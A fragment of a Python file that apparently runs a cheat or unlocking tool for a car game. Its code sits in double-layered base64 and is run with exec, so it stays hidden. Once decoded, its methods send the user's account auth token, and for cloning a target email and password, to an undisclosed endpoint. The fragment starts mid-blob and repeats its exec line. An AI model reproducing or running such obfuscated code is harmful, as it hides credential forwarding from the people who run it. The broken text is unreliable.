rSUQwZ2NtVnpjRzl1YzJVdWFuTnZiaWdwRFFvZ0lDQWdJQ0FnSUhKbGRIVnliaUJ5WlhOd2IyNXpaVjlrWldOdlpHVmtMbWRsZENnaWIyc2lLUTBLSUNBZ0lDQWdJQ0FOQ2lBZ0lDQmtaV1lnYUdWaFpHeHBaMmgwS0hObGJHWXNJR05oY2w5cFpDazZEUW9nSUNBZ0lDQWdJSEJoZVd4dllXUWdQU0I3RFFvZ0lDQWdJQ0FnSUNKaFkyTnZkVzUwWDJGMWRHZ2lPaUJ6Wld4bUxtRjFkR2hmZEc5clpXNHNEUW9nSUNBZ0lDQWdJQ0pqWVhKZmFXUWlPaUJqWVhKZmFXUU5DaUFnSUNBZ0lDQWdmUTBLSUNBZ0lDQWdJQ0J3WVhKaGJYTWdQU0I3SW10bGVTSTZJSE5sYkdZdVlXTmpaWE56WDJ0bGVYME5DaUFnSUNBZ0lDQWdjbVZ6Y0c5dWMyVWdQU0J5WlhGMVpYTjBjeTV3YjNOMEtHWWllMTlmUlU1RVVFOUpUbFJmVlZKTVgxOTlMMmhsWVdSc2FXZG9kQ0lzSUhCaGNtRnRjejF3WVhKaGJYTXNJR1JoZEdFOWNHRjViRzloWkNrTkNpQWdJQ0FnSUNBZ2NtVnpjRzl1YzJWZlpHVmpiMlJsWkNBOUlISmxjM0J2Ym5ObExtcHpiMjRvS1EwS0lDQWdJQ0FnSUNCeVpYUjFjbTRnY21WemNHOXVjMlZmWkdWamIyUmxaQzVuWlhRb0ltOXJJaWtOQ2cwS0lDQWdJR1JsWmlCMWJteHZZMnRmWTNKdmQyNG9jMlZzWmlrZ0xUNGdZbTl2YkRvTkNpQWdJQ0FnSUNBZ2NHRjViRzloWkNBOUlIc2dJbUZqWTI5MWJuUmZZWFYwYUNJNklITmxiR1l1WVhWMGFGOTBiMnRsYmlCOURRb2dJQ0FnSUNBZ0lIQmhjbUZ0Y3lBOUlIc2dJbXRsZVNJNklITmxiR1l1WVdOalpYTnpYMnRsZVNCOURRb2dJQ0FnSUNBZ0lISmxjM0J2Ym5ObElEMGdjbVZ4ZFdWemRITXVjRzl6ZENobUludGZYMFZPUkZCUFNVNVVYMVZTVEY5ZmZTOTFibXh2WTJ0ZlkzSnZkMjRpTENCd1lYSmhiWE05Y0dGeVlXMXpMQ0JrWVhSaFBYQmhlV3h2WVdRcERRb2dJQ0FnSUNBZ0lISmxjM0J2Ym5ObFgyUmxZMjlrWldRZ1BTQnlaWE53YjI1elpTNXFjMjl1S0NrTkNpQWdJQ0FnSUNBZ2NtVjBkWEp1SUhKbGMzQnZibk5sWDJSbFkyOWtaV1F1WjJWMEtDSnZheUlwRFFvZ0lDQWdJQ0FnSUEwS0lDQWdJR1JsWmlCMWJteHZZMnRmWTJ4ektITmxiR1lwSUMwK0lHSnZiMnc2RFFvZ0lDQWdJQ0FnSUhCaGVXeHZZV1FnUFNCN0lDSmhZMk52ZFc1MFgyRjFkR2dpT2lCelpXeG1MbUYxZEdoZmRHOXJaVzRnZlEwS0lDQWdJQ0FnSUNCd1lYSmhiWE1nUFNCN0lDSnJaWGtpT2lCelpXeG1MbUZqWTJWemMxOXJaWGtnZlEwS0lDQWdJQ0FnSUNCeVpYTndiMjV6WlNBOUlISmxjWFZsYzNSekxuQnZjM1FvWmlKN1gxOUZUa1JRVDBsT1ZGOVZVa3hmWDMwdmRXNXNiMk5yWDJOc2N5SXNJSEJoY21GdGN6MXdZWEpoYlhNc0lHUmhkR0U5Y0dGNWJHOWhaQ2tOQ2lBZ0lDQWdJQ0FnY21WemNHOXVjMlZmWkdWamIyUmxaQ0E5SUhKbGMzQnZibk5sTG1wemIyNG9LUTBLSUNBZ0lDQWdJQ0J5WlhSMWNtNGdjbVZ6Y0c5dWMyVmZaR1ZqYjJSbFpDNW5aWFFvSW05cklpa05DZzBLSUNBZ0lHUmxaaUJ5WldGeVgySjFiWEJsY2loelpXeG1MQ0JqWVhKZmFXUXBPZzBLSUNBZ0lDQWdJQ0J3WVhsc2IyRmtJRDBnZXcwS0lDQWdJQ0FnSUNBaVlXTmpiM1Z1ZEY5aGRYUm9Jam9nYzJWc1ppNWhkWFJvWDNSdmEyVnVMQTBLSUNBZ0lDQWdJQ0FpWTJGeVgybGtJam9nWTJGeVgybGtMQTBLSUNBZ0lDQWdJQ0I5RFFvZ0lDQWdJQ0FnSUhCaGNtRnRjeUE5SUhzaWEyVjVJam9nYzJWc1ppNWhZMk5sYzNOZmEyVjVmUTBLSUNBZ0lDQWdJQ0J5WlhOd2IyNXpaU0E5SUhKbGNYVmxjM1J6TG5CdmMzUW9aaUo3WDE5RlRrUlFUMGxPVkY5VlVreGZYMzB2Y21WaGNsOWlkVzF3WlhJaUxDQndZWEpoYlhNOWNHRnlZVzF6TENCa1lYUmhQWEJoZVd4dllXUXBEUW9nSUNBZ0lDQWdJSEpsYzNCdmJuTmxYMlJsWTI5a1pXUWdQU0J5WlhOd2IyNXpaUzVxYzI5dUtDa05DaUFnSUNBZ0lDQWdjbVYwZFhKdUlISmxjM0J2Ym5ObFgyUmxZMjlrWldRdVoyVjBLQ0p2YXlJcERRb2dJQ0FnSUNBZ0lBMEtJQ0FnSUdSbFppQm1jbTl1ZEY5aWRXMXdaWElvYzJWc1ppd2dZMkZ5WDJsa0tUb05DaUFnSUNBZ0lDQWdjR0Y1Ykc5aFpDQTlJSHNOQ2lBZ0lDQWdJQ0FnSW1GalkyOTFiblJmWVhWMGFDSTZJSE5sYkdZdVlYVjBhRjkwYjJ0bGJpd05DaUFnSUNBZ0lDQWdJbU5oY2w5cFpDSTZJR05oY2w5cFpDd05DaUFnSUNBZ0lDQWdmUTBLSUNBZ0lDQWdJQ0J3WVhKaGJYTWdQU0I3SW10bGVTSTZJSE5sYkdZdVlXTmpaWE56WDJ0bGVYME5DaUFnSUNBZ0lDQWdjbVZ6Y0c5dWMyVWdQU0J5WlhGMVpYTjBjeTV3YjNOMEtHWWllMTlmUlU1RVVFOUpUbFJmVlZKTVgxOTlMMlp5YjI1MFgySjFiWEJsY2lJc0lIQmhjbUZ0Y3oxd1lYSmhiWE1zSUdSaGRHRTljR0Y1Ykc5aFpDa05DaUFnSUNBZ0lDQWdjbVZ6Y0c5dWMyVmZaR1ZqYjJSbFpDQTlJSEpsYzNCdmJuTmxMbXB6YjI0b0tRMEtJQ0FnSUNBZ0lDQnlaWFIxY200Z2NtVnpjRzl1YzJWZlpHVmpiMlJsWkM1blpYUW9JbTlySWlrTkNpQWdJQ0FOQ2lBZ0lDQmtaV1lnZEdWc2JYVnVibTl1WjI5a2VpaHpaV3htTENCallYSmZhV1FzSUdOMWMzUnZiU2s2RFFvZ0lDQWdJQ0FnSUhCaGVXeHZZV1FnUFNCN0RRb2dJQ0FnSUNBZ0lDSmhZMk52ZFc1MFgyRjFkR2dpT2lCelpXeG1MbUYxZEdoZmRHOXJaVzRzRFFvZ0lDQWdJQ0FnSUNKallYSmZhV1FpT2lCallYSmZhV1FzRFFvZ0lDQWdJQ0FnSUNKamRYTjBiMjBpT2lCamRYTjBiMjBzRFFvZ0lDQWdJQ0FnSUgwTkNpQWdJQ0FnSUNBZ2NHRnlZVzF6SUQwZ2V5SnJaWGtpT2lCelpXeG1MbUZqWTJWemMxOXJaWGw5RFFvZ0lDQWdJQ0FnSUhKbGMzQnZibk5sSUQwZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2htSW50ZlgwVk9SRkJQU1U1VVgxVlNURjlmZlM5MFpXeHRkVzV1YjI1bmIyUjZJaXdnY0dGeVlXMXpQWEJoY21GdGN5d2daR0YwWVQxd1lYbHNiMkZrS1EwS0lDQWdJQ0FnSUNCeVpYTndiMjV6WlY5a1pXTnZaR1ZrSUQwZ2NtVnpjRzl1YzJVdWFuTnZiaWdwRFFvZ0lDQWdJQ0FnSUhKbGRIVnliaUJ5WlhOd2IyNXpaVjlrWldOdlpHVmtMbWRsZENnaWIyc2lLUTBLSUNBZ0lDQWdJQ0FOQ2lBZ0lDQmtaV1lnZEdWc2JYVnVibTl1WjI5dWVpaHpaV3htTENCallYSmZhV1FzSUdOMWMzUnZiU2s2RFFvZ0lDQWdJQ0FnSUhCaGVXeHZZV1FnUFNCN0RRb2dJQ0FnSUNBZ0lDSmhZMk52ZFc1MFgyRjFkR2dpT2lCelpXeG1MbUYxZEdoZmRHOXJaVzRzRFFvZ0lDQWdJQ0FnSUNKallYSmZhV1FpT2lCallYSmZhV1FzRFFvZ0lDQWdJQ0FnSUNKamRYTjBiMjBpT2lCamRYTjBiMjBzRFFvZ0lDQWdJQ0FnSUgwTkNpQWdJQ0FnSUNBZ2NHRnlZVzF6SUQwZ2V5SnJaWGtpT2lCelpXeG1MbUZqWTJWemMxOXJaWGw5RFFvZ0lDQWdJQ0FnSUhKbGMzQnZibk5sSUQwZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2htSW50ZlgwVk9SRkJQU1U1VVgxVlNURjlmZlM5MFpXeHRkVzV1YjI1bmIyNTZJaXdnY0dGeVlXMXpQWEJoY21GdGN5d2daR0YwWVQxd1lYbHNiMkZrS1EwS0lDQWdJQ0FnSUNCeVpYTndiMjV6WlY5a1pXTnZaR1ZrSUQwZ2NtVnpjRzl1YzJVdWFuTnZiaWdwRFFvZ0lDQWdJQ0FnSUhKbGRIVnliaUJ5WlhOd2IyNXpaVjlrWldOdlpHVmtMbWRsZENnaWIyc2lLUTBLSUNBZ0lDQWdJQ0FOQ2lBZ0lDQmtaV1lnYVc1amJHbHVaU2h6Wld4bUxDQmpZWEpmYVdRc0lHTjFjM1J2YlNrNkRRb2dJQ0FnSUNBZ0lIQmhlV3h2WVdRZ1BTQjdEUW9nSUNBZ0lDQWdJQ0poWTJOdmRXNTBYMkYxZEdnaU9pQnpaV3htTG1GMWRHaGZkRzlyWlc0c0RRb2dJQ0FnSUNBZ0lDSmpZWEpmYVdRaU9pQmpZWEpmYVdRc0RRb2dJQ0FnSUNBZ0lDSmpkWE4wYjIwaU9pQmpkWE4wYjIwc0RRb2dJQ0FnSUNBZ0lIME5DaUFnSUNBZ0lDQWdjR0Z5WVcxeklEMGdleUpyWlhraU9pQnpaV3htTG1GalkyVnpjMTlyWlhsOURRb2dJQ0FnSUNBZ0lISmxjM0J2Ym5ObElEMGdjbVZ4ZFdWemRITXVjRzl6ZENobUludGZYMFZPUkZCUFNVNVVYMVZTVEY5ZmZTOXBibU5zYVc1bElpd2djR0Z5WVcxelBYQmhjbUZ0Y3l3Z1pHRjBZVDF3WVhsc2IyRmtLUTBLSUNBZ0lDQWdJQ0J5WlhOd2IyNXpaVjlrWldOdlpHVmtJRDBnY21WemNHOXVjMlV1YW5OdmJpZ3BEUW9nSUNBZ0lDQWdJSEpsZEhWeWJpQnlaWE53YjI1elpWOWtaV052WkdWa0xtZGxkQ2dpYjJzaUtRMEtEUW9nSUNBZ1pHVm1JR052Y0hsZmJHbDJaWEo1S0hObGJHWXNJSE52ZFhKalpWOWpZWEpmYVdRc0lIUmhjbWRsZEY5allYSmZhV1FwT2cwS0lDQWdJQ0FnSUNCd1lYbHNiMkZrSUQwZ2V3MEtJQ0FnSUNBZ0lDQWlZV05qYjNWdWRGOWhkWFJvSWpvZ2MyVnNaaTVoZFhSb1gzUnZhMlZ1TEEwS0lDQWdJQ0FnSUNBaWMyOTFjbU5sWDJOaGNsOXBaQ0k2SUhOdmRYSmpaVjlqWVhKZmFXUXNEUW9nSUNBZ0lDQWdJQ0owWVhKblpYUmZZMkZ5WDJsa0lqb2dkR0Z5WjJWMFgyTmhjbDlwWkN3TkNpQWdJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ0lDQndZWEpoYlhNZ1BTQjdJbXRsZVNJNklITmxiR1l1WVdOalpYTnpYMnRsZVgwTkNpQWdJQ0FnSUNBZ2NtVnpjRzl1YzJVZ1BTQnlaWEYxWlhOMGN5NXdiM04wS0dZaWUxOWZSVTVFVUU5SlRsUmZWVkpNWDE5OUwyTnZjSGxmYkdsMlpYSjVJaXdnY0dGeVlXMXpQWEJoY21GdGN5d2daR0YwWVQxd1lYbHNiMkZrS1EwS0lDQWdJQ0FnSUNCeVpYTndiMjV6WlY5a1pXTnZaR1ZrSUQwZ2NtVnpjRzl1YzJVdWFuTnZiaWdwRFFvZ0lDQWdJQ0FnSUhKbGRIVnliaUJ5WlhOd2IyNXpaVjlrWldOdlpHVmtMbWRsZENnaWIyc2lLUTBLSUNBZ0lDQWdJQ0FOQ2lBZ0lDQmtaV1lnWTJ4dmJtVmZZMkZ5WDNSdktITmxiR1lzSUhOdmRYSmpaVjlqWVhKZmFXUXNJSFJoY21kbGRGOWxiV0ZwYkN3Z2RHRnlaMlYwWDNCaGMzTjNiM0prS1RvTkNpQWdJQ0FnSUNBZ2NHRjViRzloWkNBOUlIc05DaUFnSUNBZ0lDQWdJbUZqWTI5MWJuUmZZWFYwYUNJNklITmxiR1l1WVhWMGFGOTBiMnRsYml3TkNpQWdJQ0FnSUNBZ0luTnZkWEpqWlY5allYSmZhV1FpT2lCemIzVnlZMlZmWTJGeVgybGtMQTBLSUNBZ0lDQWdJQ0FpZEdGeVoyVjBYMlZ0WVdsc0lqb2dkR0Z5WjJWMFgyVnRZV2xzTEEwS0lDQWdJQ0FnSUNBaWRHRnlaMlYwWDNCaGMzTjNiM0prSWpvZ2RHRnlaMlYwWDNCaGMzTjNiM0prRFFvZ0lDQWdJQ0FnSUgwTkNpQWdJQ0FnSUNBZ2NHRnlZVzF6SUQwZ2V5SnJaWGtpT2lCelpXeG1MbUZqWTJWemMxOXJaWGw5RFFvZ0lDQWdJQ0FnSUhKbGMzQnZibk5sSUQwZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2htSW50ZlgwVk9SRkJQU1U1VVgxVlNURjlmZlM5amJHOXVaVjlqWVhKZmRHOGlMQ0J3WVhKaGJYTTljR0Z5WVcxekxDQmtZWFJoUFhCaGVXeHZZV1FwRFFvZ0lDQWdJQ0FnSUhKbGMzQnZibk5sWDJSbFkyOWtaV1FnUFNCeVpYTndiMjV6WlM1cWMyOXVLQ2tOQ2lBZ0lDQWdJQ0FnY21WMGRYSnVJSEpsYzNCdmJuTmxYMlJsWTI5a1pXUXVaMlYwS0NKdmF5SXBEUW9nSUNBZ0lDQWdJQTBLSUNBZ0lHUmxaaUJqYjNCNVgyTmhjbDkwYnloelpXeG1MQ0J6YjNWeVkyVmZZMkZ5WDJsa0xDQjBZWEpuWlhSZlpXMWhhV3dzSUhSaGNtZGxkRjl3WVhOemQyOXlaQ3dnZEdGeVoyVjBYMk5oY2w5cFpDazZEUW9nSUNBZ0lDQWdJSEJoZVd4dllXUWdQU0I3RFFvZ0lDQWdJQ0FnSUNKaFkyTnZkVzUwWDJGMWRHZ2lPaUJ6Wld4bUxtRjFkR2hmZEc5clpXNHNEUW9nSUNBZ0lDQWdJQ0p6YjNWeVkyVmZZMkZ5WDJsa0lqb2djMjkxY21ObFgyTmhjbDlwWkN3TkNpQWdJQ0FnSUNBZ0luUmhjbWRsZEY5bGJXRnBiQ0k2SUhSaGNtZGxkRjlsYldGcGJDd05DaUFnSUNBZ0lDQWdJblJoY21kbGRGOXdZWE56ZDI5eVpDSTZJSFJoY21kbGRGOXdZWE56ZDI5eVpDd05DaUFnSUNBZ0lDQWdJblJoY21kbGRGOWpZWEpmYVdRaU9pQjBZWEpuWlhSZmNHRnpjM2R2Y21RTkNpQWdJQ0FnSUNBZ2ZRMEtJQ0FnSUNBZ0lDQndZWEpoYlhNZ1BTQjdJbXRsZVNJNklITmxiR1l1WVdOalpYTnpYMnRsZVgwTkNpQWdJQ0FnSUNBZ2NtVnpjRzl1YzJVZ1BTQnlaWEYxWlhOMGN5NXdiM04wS0dZaWUxOWZSVTVFVUU5SlRsUmZWVkpNWDE5OUwyTnZjSGxmWTJGeVgzUnZJaXdnY0dGeVlXMXpQWEJoY21GdGN5d2daR0YwWVQxd1lYbHNiMkZrS1EwS0lDQWdJQ0FnSUNCeVpYTndiMjV6WlY5a1pXTnZaR1ZrSUQwZ2NtVnpjRzl1YzJVdWFuTnZiaWdwRFFvZ0lDQWdJQ0FnSUhKbGRIVnliaUJ5WlhOd2IyNXpaVjlrWldOdlpHVmtMbWRsZENnaWIyc2lLUTBLRFFvZ0lDQWdaR1ZtSUhOb2FYUjBhVzRvYzJWc1ppa2dMVDRnWW05dmJEb2dEUW9nSUNBZ0lDQWdJSEJoZVd4dllXUWdQU0I3SUNKaFkyTnZkVzUwWDJGMWRHZ2lPaUJ6Wld4bUxtRjFkR2hmZEc5clpXNGdmU0FOQ2lBZ0lDQWdJQ0FnY0dGeVlXMXpJRDBnZXlBaWEyVjVJam9nYzJWc1ppNWhZMk5sYzNOZmEyVjVJSDBnRFFvZ0lDQWdJQ0FnSUhKbGMzQnZibk5sSUQwZ2NtVnhkV1Z6ZEhNdWNHOXpkQ2htSW50ZlgwVk9SRkJQU1U1VVgxVlNURjlmZlM5emFHbDBkR2x1SWl3Z2NHRnlZVzF6UFhCaGNtRnRjeXdnWkdGMFlUMXdZWGxzYjJGa0tTQU5DaUFnSUNBZ0lDQWdjbVZ6Y0c5dWMyVmZaR1ZqYjJSbFpDQTlJSEpsYzNCdmJuTmxMbXB6YjI0b0tTQU5DaUFnSUNBZ0lDQWdjbVYwZFhKdUlISmxjM0J2Ym5ObFgyUmxZMjlrWldRdVoyVjBLQ0p2YXlJcERRb05DZz09JycnDQpleGVjKGJhc2U2NC5iNjRkZWNvZGUoZW5jb2RlZF9kYXRhKS5kZWNvZGUoJ3V0Zi04JykpDQo='''
exec(base64.b64decode(encoded_data).decode('utf-8'))
'''
exec(base64.b64decode(encoded_data).decode('utf-8'))
